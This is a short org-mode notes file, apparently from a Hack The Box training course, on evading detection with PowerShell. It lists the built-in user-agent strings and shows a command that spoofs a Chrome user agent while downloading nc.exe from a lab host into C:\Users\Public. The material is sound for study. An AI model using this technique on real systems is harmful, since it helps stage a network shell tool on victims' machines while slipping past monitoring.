@@ -1,0 +1,17 @@
+:PROPERTIES:
+:ID:       2d4106fb-a811-4f43-88c5-d193a80d5d6e
+:END:
+#+title: detection
+#+OPTIONS toc:2
+
+* Evading detection
+** Changing User Agent
+#+begin_src powershell
+PS C:\htb>[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl
+#+end_src
+
+** Request with chrome user agent
+#+begin_src powershell
+PS C:\htb> $UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
+PS C:\htb> Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
+#+end_src
